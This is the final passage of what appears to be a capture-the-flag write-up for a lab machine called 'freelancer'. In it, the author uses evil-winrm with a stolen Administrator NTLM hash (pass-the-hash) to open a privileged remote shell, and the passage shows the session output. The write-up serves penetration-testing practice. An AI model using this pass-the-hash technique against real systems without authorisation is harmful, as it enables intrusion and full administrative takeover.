</span></span></span></code></pre></div><p>Since they work, I use it to spawn a privileged session with <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -u &#39;Administrator&#39; -H &#39;0039318f1e8274633445bce32ad1a290&#39; -i 10.10.11.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>freelancer\administrator
</span></span></span></code></pre></div><p>where we can read the <code>root</code> flag at <code>Administrator</code> user Desktop.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>